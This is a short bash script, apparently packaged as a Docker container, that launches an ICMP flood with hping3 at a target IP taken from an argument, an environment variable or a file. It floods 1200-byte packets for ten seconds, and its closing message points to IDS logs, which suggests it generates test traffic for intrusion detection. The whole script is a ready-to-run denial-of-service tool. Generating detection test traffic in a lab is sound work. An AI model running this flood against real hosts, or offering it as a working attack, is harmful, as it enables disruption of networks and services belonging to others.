#!/usr/bin/env bash

# Aceita IP via argumento na linha de comando ($1) ou variável de ambiente
if [ -n "$1" ]; then
    # IP passado como argumento: docker run ping-flood 192.168.1.100
    TARGET_HOST="$1"
elif [ -n "$TARGET_IP" ]; then
    # Variável de ambiente: docker run -e TARGET_IP="..." ping-flood
    TARGET_HOST="$TARGET_IP"
elif [ -n "$TARGET_HOST" ]; then
    TARGET_HOST="$TARGET_HOST"
else
    # Fallback: tenta ler de target.var se existir
    if [ -f /tmp/target.var ]; then
        source /tmp/target.var
    else
        echo "[ERROR] Please provide TARGET_IP as argument or environment variable"
        echo "Usage: docker run --rm --network host --cap-add=NET_RAW ping-flood <TARGET_IP>"
        echo "   or: docker run --rm --network host --cap-add=NET_RAW -e TARGET_IP=<IP> ping-flood"
        exit 1
    fi
fi

echo "[+] Starting ICMP Flood Attack"
echo "[+] Target: ${TARGET_HOST}"
echo "[+] Attack details:"
echo "    - Tool: hping3"
echo "    - Duration: 10 seconds"
echo "    - Payload: 1200 bytes"
echo "    - Mode: Flood (maximum speed)"
echo ""

# hping3 com flood mode:
# -1 = ICMP mode
# -d 1200 = payload de 1200 bytes
# --flood = envia pacotes o mais rápido possível
# --rand-source = randomiza source (opcional, comentado para manter source real)
timeout 10 hping3 -1 -d 1200 --flood ${TARGET_HOST} 2>&1 | grep -E "statistic|packets" | head -5

# Aguardar um pouco para o tráfego ser capturado
sleep 3

echo ""
echo "[+] Attack completed!"
echo "[+] Generated high-volume ICMP flood with large payloads"
echo "[+] Check your IDS logs for ICMP flood detections"